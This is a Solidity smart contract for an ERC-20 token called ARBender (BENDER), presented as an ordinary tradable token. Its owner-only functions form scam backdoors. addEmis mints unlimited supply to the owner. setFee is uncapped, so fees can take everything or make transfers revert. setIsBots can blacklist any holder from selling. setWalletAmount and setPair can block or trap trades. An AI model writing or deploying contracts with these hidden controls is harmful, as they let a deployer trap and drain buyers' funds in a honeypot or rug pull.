// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./IERC20Metadata.sol";
import "./Context.sol";
import "./ERC20.sol";
import "./draft-IERC20Permit.sol";
import "./Address.sol";
import "./SafeERC20.sol";
import "./Ownable.sol";
import "./EnumerableSet.sol";


pragma solidity =0.8.19;
contract ARBender is ERC20, Ownable {
    using SafeERC20 for IERC20;
    using EnumerableSet for EnumerableSet.AddressSet;

    event Trade(address user, uint256 amount, uint side, uint timestamp);

    mapping(address => bool) public isFeeExempt;

    uint256 private fee = 0;
    uint256 public maxWalletAmount = 0;
    uint256 public minWalletAmount = 0;

    uint256 public launchedAt;
    bool private initialized;
    mapping(address => bool) public isBot;

    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;
    address private FEE_COLLECTOR = 0x0000000000000000000000000000000000000000;
    address private PAIR;

    EnumerableSet.AddressSet private _pairs;

    constructor(
    ) ERC20("ARBender", "BENDER") {
        uint256 _totalSupply = 2_716_057_000_000 * 1e6;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        _mint(_msgSender(), _totalSupply);
    }

    function decimals() public view virtual override returns (uint8) {
        return 6;
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        return __Transfer(_msgSender(), to, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(sender, spender, amount);
        return __Transfer(sender, recipient, amount);
    }

    function __Transfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool shouldTakeFee = (!isFeeExempt[sender] && !isFeeExempt[recipient]);
        if (shouldTakeFee) {
            require(launched(), "Trading not open yet");
        }
	if( shouldTakeFee && maxWalletAmount > 0 && sender == PAIR ){
	    require(super.balanceOf(recipient) + amount <= maxWalletAmount, "Limits max");
        }
	if( shouldTakeFee && minWalletAmount > 0 && sender == PAIR ){
	    require(super.balanceOf(recipient) + amount >= minWalletAmount, "Limits min");
        }
        require(!isBot[sender] && !isBot[recipient], "Bot");
        // Buy or Sell
        uint side = 0;
        if( sender == PAIR ){
            side = 1;
        }else if( recipient == PAIR ){
            side = 2;
        }else{
            shouldTakeFee = false;
        }

        uint256 amountReceived = shouldTakeFee ? takeFee(sender, amount) : amount;
        _transfer(sender, recipient, amountReceived);
        return true;
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = (amount * fee * 100) / 10000;
        if( feeAmount > 0 ){
            _transfer(sender, FEE_COLLECTOR, feeAmount);
        }
        return amount - feeAmount;
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return totalSupply() - balanceOf(DEAD) - balanceOf(ZERO);
    }

    //
    // onlyOwner
    //
    function launch() external onlyOwner {
        require(launchedAt == 0, "Already launched");
        launchedAt = block.number;
        fee = 0;
    }

    function setWalletAmount(uint256 _min, uint256 _max) external onlyOwner {
        minWalletAmount = _min;
        maxWalletAmount = _max;
    }

    function rescueToken(address tokenAddress) external onlyOwner {
        IERC20(tokenAddress).safeTransfer(msg.sender,IERC20(tokenAddress).balanceOf(address(this)));
    }
    function clearStuckEthBalance() external onlyOwner {
        uint256 amountETH = address(this).balance;
        (bool success, ) = payable(_msgSender()).call{value: amountETH}(new bytes(0));
        require(success, 'ETH_TRANSFER_FAILED');
    }

    function setIsBots(address[] calldata _bots, bool _state) external onlyOwner {
        for( uint256 i = 0; i < _bots.length; i++ ){
            isBot[_bots[i]] = _state;
        }
    }

    function setFee(uint256 _fee) external onlyOwner {
        fee = _fee;
    }

    function setFeeCollector(address _to) external onlyOwner {
        FEE_COLLECTOR = _to;
    }

    function addEmis(uint256 _add) external onlyOwner {
	_mint(msg.sender, _add);
    }

    function setPair(address _pair) external onlyOwner {
	PAIR = _pair;
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    receive() external payable {}
}







